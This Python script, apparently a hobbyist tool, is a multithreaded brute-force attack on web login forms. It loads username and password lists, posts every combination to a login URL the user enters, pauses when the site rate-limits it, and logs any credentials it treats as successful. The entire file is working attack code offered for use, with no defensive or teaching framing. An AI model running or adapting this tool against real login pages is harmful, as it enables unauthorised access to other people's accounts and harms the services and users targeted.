import json
import time
import requests
import threading
import logging
from queue import Queue
import pyfiglet
from termcolor import colored

def display_header():
    ascii_art = pyfiglet.figlet_format("KARTAVYA CODES", font="mini")
    colored_art = colored(ascii_art, color='red')
    print(colored_art)

logging.basicConfig(filename='bruteforce.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def load_credentials(file_path):
    file_path = file_path.strip('"')
    with open(file_path, "r") as file:
        return [line.strip() for line in file.readlines()]

def attempt_login(username, password, url):
    data = {
        "username": username,
        "password": password
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"[+] Login successful! Username: {username}, Password: {password}")
            logging.info(f"Login successful! Username: {username}, Password: {password}")
            return True
        elif response.status_code == 429:
            print("[-] Rate limit exceeded. Adjusting rate.")
            time.sleep(60)
        else:
            print(f"[-] Failed login: {username} / {password}")
            logging.info(f"Failed login attempt: {username} / {password}")
    except requests.RequestException as e:
        logging.error(f"Request failed: {e}")
    return False

def worker(queue, rate_limit, url):
    while not queue.empty():
        username, password = queue.get()
        attempt_login(username, password, url)
        time.sleep(1 / rate_limit)
        queue.task_done()

def main():
    display_header()

    url = input("Enter the URL of the login page: ").strip()
    username_file = input("Enter path to the username file: ").strip('"')
    password_file = input("Enter path to the password file: ").strip('"')

    rate_limit = 5
    num_threads = 5

    usernames = load_credentials(username_file)
    passwords = load_credentials(password_file)

    queue = Queue()
    
    for username in usernames:
        for password in passwords:
            queue.put((username, password))

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(queue, rate_limit, url))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
